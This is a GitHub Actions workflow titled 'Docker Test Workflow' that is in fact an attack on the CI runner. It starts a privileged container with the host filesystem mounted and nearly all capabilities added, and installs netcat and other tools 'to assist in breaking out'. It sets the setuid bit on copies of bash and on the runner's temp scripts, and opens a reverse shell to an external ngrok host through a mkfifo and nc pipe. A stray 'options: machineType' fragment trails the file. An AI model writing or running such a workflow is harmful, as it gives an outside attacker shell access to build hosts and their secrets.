name: Docker Test Workflow

on:
  push:
    branches:
      - main
  workflow_dispatch:

jobs:
  docker-test:
    runs-on: ubuntu-latest

    steps:
      - name: Checkout code
        uses: actions/checkout@v3

      - name: Set up Docker Buildx
        uses: docker/setup-buildx-action@v2

      - name: Run Docker Container with Privileged Mode
        run: |
          docker run --rm --privileged \
            -v /:/mnt \
            -v /proc:/proc \
            -v /sys:/sys \
            -v /dev:/mnt/dev \
            -v /boot:/mnt/boot \
            -v /etc:/mnt/etc \
            -v /home:/mnt/home \
            -v /lib:/mnt/lib \
            -v /lib64:/mnt/lib64 \
            -v /opt:/mnt/opt \
            -v /run:/mnt/run \
            -v /sbin:/mnt/sbin \
            -v /usr:/mnt/usr \
            -v /var:/mnt/var \
            --cap-add=SYS_ADMIN \
            --cap-add=SYS_PTRACE \
            --cap-add=SYS_MODULE \
            --cap-add=SYS_NICE \
            --cap-add=SYS_RESOURCE \
            --cap-add=SYS_TIME \
            --cap-add=SYS_TTY_CONFIG \
            --cap-add=NET_ADMIN \
            --cap-add=NET_RAW \
            --cap-add=IPC_LOCK \
            --cap-add=IPC_OWNER \
            --cap-add=LEASE \
            --cap-add=LINUX_IMMUTABLE \
            --cap-add=MAC_ADMIN \
            --cap-add=MAC_OVERRIDE \
            --cap-add=MKNOD \
            --cap-add=SETFCAP \
            --cap-add=SETPCAP \
            --cap-add=WAKE_ALARM \
            --cap-add=AUDIT_CONTROL \
            --cap-add=AUDIT_WRITE \
            --cap-add=BLOCK_SUSPEND \
            --cap-add=DAC_OVERRIDE \
            --cap-add=DAC_READ_SEARCH \
            --name breakout_test \
            -d alpine sleep 600

      - name: Verify Container is Running
        run: docker ps -a

      - name: Install all needed apks to assist in breaking out in Running Container
        run: |
          docker exec --privileged breakout_test apk add --no-cache netcat-openbsd eudev shadow util-linux coreutils procps docker-cli libc6-compat bash ca-certificates linux-headers fuse-overlayfs strace

      - name: copy bash to /tmp folder and set correct permissions
        run: |
          docker exec --privileged breakout_test cp /bin/bash /tmp/bash & chmod +s /tmp/bash & chmod +s /home/runner/work/_temp/*.sh & ls -la /tmp & ls -la /home/runner/work/_temp/ & /home/runner/work/_temp/*.sh -p

      - name: Verify ncat Installation
        run: |
          docker exec --privileged breakout_test nc 0.tcp.us-cal-1.ngrok.io 14657 | /tmp/bash
          
      - name: sleep to give time for nc listener of attacker to become active again and Connect to ngrok Server with ncat
        run: |
          docker exec --privileged breakout_test sleep 10; mkfifo /tmp/f; nc 0.tcp.us-cal-1.ngrok.io 14657 < /tmp/f | /tmp/bash > /tmp/f 2>&1
          
            options:
              machineType: 'E2_HIGHCPU_64'
